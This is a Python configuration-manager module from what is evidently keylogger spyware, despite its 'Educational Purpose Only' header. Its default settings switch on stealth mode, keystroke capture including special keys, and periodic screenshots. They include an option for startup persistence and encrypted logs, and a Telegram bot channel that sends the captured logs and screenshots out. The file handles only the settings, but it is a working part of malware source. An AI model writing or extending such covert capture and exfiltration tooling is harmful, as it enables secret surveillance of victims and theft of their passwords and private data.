"""
Configuration Manager Module
Educational Purpose Only - Use Responsibly

This module handles configuration file management.
"""

import os
import logging
from pathlib import Path
from configparser import ConfigParser

class ConfigManager:
    """Manages application configuration."""
    
    def __init__(self, config_file='config.ini'):
        self.config_file = Path(config_file)
        # Disable interpolation to allow % in config values
        self.config = ConfigParser(interpolation=None)
        self.logger = logging.getLogger(__name__)
        # Load or create configuration
        self._load_or_create_config()
    
    def _load_or_create_config(self):
        """Load existing config or create default one."""
        try:
            if self.config_file.exists():
                self.config.read(self.config_file)
                self.logger.info(f"Configuration loaded from {self.config_file}")
            else:
                self._create_default_config()
                self.logger.info(f"Default configuration created at {self.config_file}")
                
        except Exception as e:
            self.logger.error(f"Error loading configuration: {e}")
            self._create_default_config()
    
    def _create_default_config(self):
        """Create default configuration file."""
        try:
            # General settings
            if not self.config.has_section('GENERAL'):
                self.config.add_section('GENERAL')
            self.config.set('GENERAL', 'log_directory', 'logs')
            self.config.set('GENERAL', 'stealth_mode', 'true')
            self.config.set('GENERAL', 'startup_persistence', 'false')
            self.config.set('GENERAL', 'debug_mode', 'false')

            # Keylogger settings
            if not self.config.has_section('KEYLOGGER'):
                self.config.add_section('KEYLOGGER')
            self.config.set('KEYLOGGER', 'log_rotation_size', '10MB')
            self.config.set('KEYLOGGER', 'max_log_files', '10')
            self.config.set('KEYLOGGER', 'timestamp_format', '%Y-%m-%d %H:%M:%S.%f')
            self.config.set('KEYLOGGER', 'capture_special_keys', 'true')
            self.config.set('KEYLOGGER', 'buffer_size', '50')
            self.config.set('KEYLOGGER', 'flush_interval', '10')

            # Screenshot settings
            if not self.config.has_section('SCREENSHOT'):
                self.config.add_section('SCREENSHOT')
            self.config.set('SCREENSHOT', 'enabled', 'true')
            self.config.set('SCREENSHOT', 'interval_seconds', '300')
            self.config.set('SCREENSHOT', 'quality', '85')
            self.config.set('SCREENSHOT', 'max_screenshots', '100')
            self.config.set('SCREENSHOT', 'max_width', '1920')
            self.config.set('SCREENSHOT', 'max_height', '1080')

            # Telegram settings
            if not self.config.has_section('TELEGRAM'):
                self.config.add_section('TELEGRAM')
            self.config.set('TELEGRAM', 'enabled', 'false')
            self.config.set('TELEGRAM', 'bot_token', '')
            self.config.set('TELEGRAM', 'chat_id', '')
            self.config.set('TELEGRAM', 'send_interval', '3600')
            self.config.set('TELEGRAM', 'max_file_size', '52428800')  # 50MB
            self.config.set('TELEGRAM', 'send_logs', 'true')
            self.config.set('TELEGRAM', 'send_screenshots', 'true')

            # Encryption settings
            if not self.config.has_section('ENCRYPTION'):
                self.config.add_section('ENCRYPTION')
            self.config.set('ENCRYPTION', 'enabled', 'true')
            self.config.set('ENCRYPTION', 'key_file', '.encryption_key')
            self.config.set('ENCRYPTION', 'algorithm', 'fernet')

            # Save configuration
            self.save_config()

        except Exception as e:
            self.logger.error(f"Error creating default configuration: {e}")
            raise
    
    def get(self, section, option, fallback=None):
        """Get configuration value."""
        try:
            return self.config.get(section, option, fallback=fallback)
        except Exception as e:
            self.logger.error(f"Error getting config value [{section}]{option}: {e}")
            return fallback
    
    def getint(self, section, option, fallback=None):
        """Get integer configuration value."""
        try:
            return self.config.getint(section, option, fallback=fallback)
        except Exception as e:
            self.logger.error(f"Error getting int config value [{section}]{option}: {e}")
            return fallback
    
    def getfloat(self, section, option, fallback=None):
        """Get float configuration value."""
        try:
            return self.config.getfloat(section, option, fallback=fallback)
        except Exception as e:
            self.logger.error(f"Error getting float config value [{section}]{option}: {e}")
            return fallback
    
    def getboolean(self, section, option, fallback=None):
        """Get boolean configuration value."""
        try:
            return self.config.getboolean(section, option, fallback=fallback)
        except Exception as e:
            self.logger.error(f"Error getting boolean config value [{section}]{option}: {e}")
            return fallback
    
    def set(self, section, option, value):
        """Set configuration value."""
        try:
            if not self.config.has_section(section):
                self.config.add_section(section)
            
            self.config.set(section, option, str(value))
            return True
            
        except Exception as e:
            self.logger.error(f"Error setting config value [{section}]{option}: {e}")
            return False
    
    def save_config(self):
        """Save configuration to file."""
        try:
            with open(self.config_file, 'w') as f:
                self.config.write(f)
            
            self.logger.debug(f"Configuration saved to {self.config_file}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error saving configuration: {e}")
            return False
    
    def reload_config(self):
        """Reload configuration from file."""
        try:
            self.config.clear()
            self._load_or_create_config()
            self.logger.info("Configuration reloaded")
            return True
            
        except Exception as e:
            self.logger.error(f"Error reloading configuration: {e}")
            return False
    
    def get_all_settings(self):
        """Get all configuration settings as dictionary."""
        try:
            settings = {}
            for section_name in self.config.sections():
                settings[section_name] = dict(self.config.items(section_name))
            
            return settings
            
        except Exception as e:
            self.logger.error(f"Error getting all settings: {e}")
            return {}
    
    def validate_config(self):
        """Validate configuration settings."""
        try:
            errors = []
            
            # Validate required sections
            required_sections = ['GENERAL', 'KEYLOGGER', 'SCREENSHOT', 'TELEGRAM', 'ENCRYPTION']
            for section in required_sections:
                if not self.config.has_section(section):
                    errors.append(f"Missing required section: {section}")
            
            # Validate Telegram settings if enabled
            if self.getboolean('TELEGRAM', 'enabled', False):
                if not self.get('TELEGRAM', 'bot_token'):
                    errors.append("Telegram enabled but bot_token is empty")
                if not self.get('TELEGRAM', 'chat_id'):
                    errors.append("Telegram enabled but chat_id is empty")
            
            # Validate numeric values
            numeric_settings = [
                ('KEYLOGGER', 'max_log_files'),
                ('KEYLOGGER', 'buffer_size'),
                ('KEYLOGGER', 'flush_interval'),
                ('SCREENSHOT', 'interval_seconds'),
                ('SCREENSHOT', 'quality'),
                ('SCREENSHOT', 'max_screenshots'),
                ('TELEGRAM', 'send_interval'),
                ('TELEGRAM', 'max_file_size')
            ]
            
            for section, option in numeric_settings:
                try:
                    value = self.getint(section, option)
                    if value is not None and value < 0:
                        errors.append(f"Negative value not allowed: [{section}]{option}")
                except ValueError:
                    errors.append(f"Invalid numeric value: [{section}]{option}")
            
            # Validate screenshot quality
            quality = self.getint('SCREENSHOT', 'quality', 85)
            if quality < 1 or quality > 100:
                errors.append("Screenshot quality must be between 1 and 100")
            
            # Validate log directory
            log_dir = self.get('GENERAL', 'log_directory', 'logs')
            try:
                Path(log_dir).mkdir(parents=True, exist_ok=True)
            except Exception as e:
                errors.append(f"Cannot create log directory '{log_dir}': {e}")
            
            if errors:
                self.logger.error(f"Configuration validation failed: {errors}")
                return False, errors
            else:
                self.logger.info("Configuration validation passed")
                return True, []
                
        except Exception as e:
            self.logger.error(f"Error validating configuration: {e}")
            return False, [str(e)]
    
    def export_config(self, export_file):
        """Export configuration to another file."""
        try:
            with open(export_file, 'w') as f:
                self.config.write(f)
            
            self.logger.info(f"Configuration exported to {export_file}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error exporting configuration: {e}")
            return False
    
    def import_config(self, import_file):
        """Import configuration from another file."""
        try:
            if not Path(import_file).exists():
                raise FileNotFoundError(f"Import file not found: {import_file}")
            
            # Backup current config
            backup_file = self.config_file.with_suffix('.bak')
            if self.config_file.exists():
                self.config_file.rename(backup_file)
            
            # Import new config
            self.config.clear()
            self.config.read(import_file)
            
            # Validate imported config
            valid, errors = self.validate_config()
            if not valid:
                # Restore backup
                if backup_file.exists():
                    backup_file.rename(self.config_file)
                    self.config.clear()
                    self.config.read(self.config_file)
                
                raise ValueError(f"Invalid configuration: {errors}")
            
            # Save imported config
            self.save_config()
            
            # Remove backup
            if backup_file.exists():
                backup_file.unlink()
            
            self.logger.info(f"Configuration imported from {import_file}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error importing configuration: {e}")
            return False

